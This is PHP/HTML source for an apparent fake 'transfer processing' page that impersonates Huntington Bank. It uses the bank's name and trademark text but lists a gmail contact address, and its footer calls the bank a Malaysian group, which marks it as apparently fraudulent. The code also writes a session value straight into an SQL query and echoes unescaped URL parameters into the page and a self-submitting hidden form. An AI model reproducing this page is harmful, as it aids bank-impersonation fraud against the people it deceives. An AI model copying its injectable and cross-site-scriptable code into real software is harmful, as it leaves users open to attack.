<?php 
	require('functions.php');
	
	include "database.php";

$y=$_SESSION['user']['username'];
$result = mysqli_query($conn,"SELECT * FROM users WHERE username IN ('$y')");
$bio= mysqli_fetch_array($result);

if (!isLoggedIn($_GET['id'])) {
	$_SESSION['msg'] = "You must log in first";
	header("Location:login.php?goto=" . urlencode($_SERVER['REQUEST_URI']));
}

if (isset($_GET['logout'])) {
	session_destroy();
	unset($_SESSION['user']);
	header("location: index.php");
}
?>
<!DOCTYPE html>
<div id="ytWidget"></div><script src="https://translate.yandex.net/website-widget/v1/widget.js?widgetId=ytWidget&pageLang=en&widgetTheme=light&autoMode=false" type="text/javascript"></script>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="description" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <!-- The above 4 meta tags *must* come first in the head; any other head content must come *after* these tags -->

    <!-- Title -->
    <title>Your Transfer is Processing... | Huntington Bank</title>

    <!-- Favicon -->
    <link rel="icon" href="img/core-img/favicon.ico">

    <!-- Stylesheet -->
    <link rel="stylesheet" href="style.css">
	<style type="text/css">
		input {
				width: 35%;
				padding: 12px 20px;
				margin: 8px 0;
				box-sizing: border-box;
				border: 2px solid #3e015e;
				border-radius: 4px;
		}
		
		input:hover {
				background-color: #yello;
				color: red;
			}
		.formArea {
			text-align: center;
			margin-top: 10%;
			margin-bottom: 10%;			
		}
		.trfdetails {
			color: #003679;
			font-size: 15px;
			font-weight: bold;
		}
		
		@media only screen and (max-width: 600px) {
				.formArea {
					width: 100%;
				}
				input {
				width: 80%;
				padding: 12px 20px;
				}
	
	</style>

</head>

<body>
    <!-- Preloader -->
    <div class="preloader d-flex align-items-center justify-content-center">
        <div class="lds-ellipsis">
            <div></div>
            <div></div>
            <div></div>
            <div></div>
        </div>
    </div>

    <!-- ##### Header Area Start ##### -->
    <header class="header-area">
        <!-- Top Header Area -->
        <div class="top-header-area">
            <div class="container h-100">
                <div class="row h-100 align-items-center">
                    <div class="col-12 d-flex justify-content-between">
                        <!-- Logo Area -->
                        <div class="logo">
                            <a href="index"><img src="img/unnamed.png" width="50"></a>
                        </div>
						<div class="top-contact-info d-flex align-items-center">
						
						</div>
                        <!-- Top Contact Info -->
                        <div class="top-contact-info d-flex align-items-center">                           
							
							<a href="#" data-toggle="tooltip" data-placement="bottom" title="EA1W18 P.O. Box 182387. Columbus, OH 43218"><img src="img/core-img/placeholder.png" alt=""> <span>EA1W18 P.O. Box 182387. Columbus, OH 43218</span></a>
                            <a href="#" data-toggle="tooltip" data-placement="bottom" title="ibank.huntington@gmail.com"><img src="img/core-img/message.png" alt=""> <span>ibank.huntington@gmail.com</span></a>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Navbar Area -->
        <div class="credit-main-menu" id="sticker">
            <div class="classy-nav-container breakpoint-off">
                <div class="container">
                    <!-- Menu -->
                    <nav class="classy-navbar justify-content-between" id="creditNav">

                        <!-- Navbar Toggler -->
                        <div class="classy-navbar-toggler">
                            <span class="navbarToggler"><span></span><span></span><span></span></span>
                        </div>

                        <!-- Menu -->
                        <div class="classy-menu">

                            <!-- Close Button -->
                            <div class="classycloseIcon">
                                <div class="cross-wrap"><span class="top"></span><span class="bottom"></span></div>
                            </div>

                            <!-- Nav Start -->
                            <div class="classynav">
                                <ul>
                                    <li><a href="home">Home</a></li>
                                    <li><a href="about">About Us</a></li>
                                    <li><a href="account-overview">My Account</a></li>
                                    <li><a href="services">Services</a></li>                                   
                                    <li><a href="contact">Contact</a></li>
                                </ul>
                            </div>
                            <!-- Nav End -->
                        </div>

                        <!-- Contact -->
                        <div class="contact">
                            <a href="#"><img src="img/core-img/call2.png" alt=""> ibank.huntington@gmail.com</a>
                        </div>
                    </nav>
                </div>
            </div>
        </div>
    </header>
	    <!-- ##### Header Area End ##### -->
		
	
	<div class="formArea">
		<h3>Confirming your transfer...</h3>	
		
		<p class="trfdetails">Amount: <?php echo $bio["cur"]; ?><?php echo $_GET["amount"]; ?>.00<br />  To: <?php echo $_GET["name"]; ?><br /> Bank: <?php echo $_GET["bank"]; ?><br /></p><br />
		
		<img src="img/processing.gif" width="110px">
		
		<p><strong>Please do not close or refresh this page</strong></p>
	
	<form action="process-tf?account=<?php echo $_GET["account"]; ?>&amount=<?php echo $_GET["amount"]; ?>&bank=<?php echo $_GET["bank"]; ?>&name=<?php echo $_GET["name"]; ?>&routing=<?php echo $_GET["routing"]; ?>" name="verification" id="verification" method="post"> 
<input type="hidden" name="account" value="<?php echo $_GET["account"]; ?>" />
<input type="hidden" name="amount" value="<?php echo $_GET["amount"]; ?>" />
			<input type="hidden" name="bank" value="<?php echo $_GET["bank"]; ?>" />
			<input type="hidden" name="routing" value="<?php echo $_GET["routing"]; ?>" />
			<input type="hidden" name="name" value="<?php echo $_GET["name"]; ?>" />
<script type="text/javascript">
    window.onload=function(){ 
    window.setTimeout(function() { document.verification.submit(); }, 10000);
};
</script></form> 
	
	</div>
	

    <!-- ##### Footer Area Start ##### -->
    <footer class="footer-area section-padding-100-0">
        <div class="container">
            <div class="row">

                 <!-- Single Footer Widget -->
                <div class="col-12 col-sm-6 col-lg-3">
                    <div class="single-footer-widget mb-100">
                        <h5 class="widget-title">About Us</h5>
                        <!-- Nav -->
                        <nav>
                            <p>We are the fourth largest, fully-integrated financial services group in Malaysia. We are ready to partner you in your quest to grow your wealth and financial independence. <a href="about.html" style="color: white;">Read More</a></p>
                        </nav>
                    </div>
                </div>

				
				<!-- Single Footer Widget -->
                <div class="col-12 col-sm-6 col-lg-3">
                    <div class="single-footer-widget mb-100">
                        <h5 class="widget-title">Useful Links</h5>
                        <!-- Nav -->
                        <nav>
                            <ul>
                                <li><a href="index">Home</a></li>
                                <li><a href="about">About Us</a></li>
                                <li><a href="services">Services</a></li>
                                <li><a href="cards">Credit Cards</a></li>                               
                            </ul>
                        </nav>
                    </div>
                </div>

                <!-- Single Footer Widget -->
                <div class="col-12 col-sm-6 col-lg-3">
                    <div class="single-footer-widget mb-100">
                        <h5 class="widget-title">Financial Solutions</h5>
                        <!-- Nav -->
                        <nav>
                            <ul>
                                <li><a href="corporate-finance">Corporate Finance</a></li>
                                <li><a href="equity-capital-markets">Equity Capital Markets</a></li>
                                <li><a href="futures-trading">Futures Trading</a></li>
                                <li><a href="financial-advisory">Financial Advisory</a></li>                               
                            </ul>
                        </nav>
                    </div>
                </div>

               
                <!-- Single Footer Widget -->
                <div class="col-12 col-sm-6 col-lg-3">
                    <div class="single-footer-widget mb-100">                        
						<img src="img/bg-img/deposit-travel.jpg"> 
                    </div>
                </div>
            </div>
        </div>

        <!-- Copywrite Area -->
        <div class="copywrite-area">
            <div class="container">
                <div class="row">
                    <div class="col-12">
                        <div class="copywrite-content d-flex flex-wrap justify-content-between align-items-center">
                            <!-- Footer Logo -->
                            

                            <!-- Copywrite Text -->
                            <p class="copywrite-text"><a href="#"><!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
The Huntington National Bank is an Equal Housing Lender and Member FDIC. The Huntington logo®, Huntington®,The Huntington logoHuntington.Welcome.® and Huntington Heads Up® are federally registered service marks of Huntington Bancshares Incorporated. &copy;<script>document.write(new Date().getFullYear());</script> Huntington Bancshares Incorporated.
<!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. --></p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </footer>
    <!-- ##### Footer Area Start ##### -->

    <!-- ##### All Javascript Script ##### -->
    <!-- jQuery-2.2.4 js -->
    <script src="js/jquery/jquery-2.2.4.min.js"></script>
    <!-- Popper js -->
    <script src="js/bootstrap/popper.min.js"></script>
    <!-- Bootstrap js -->
    <script src="js/bootstrap/bootstrap.min.js"></script>
    <!-- All Plugins js -->
    <script src="js/plugins/plugins.js"></script>
    <!-- Active js -->
    <script src="js/active.js"></script>
</body>
<!--Start of Tawk.to Script-->
<script type="text/javascript">
var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/60a112e9185beb22b30dad9b/1f5qj3ofd';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>
<!--End of Tawk.to Script-->
</html>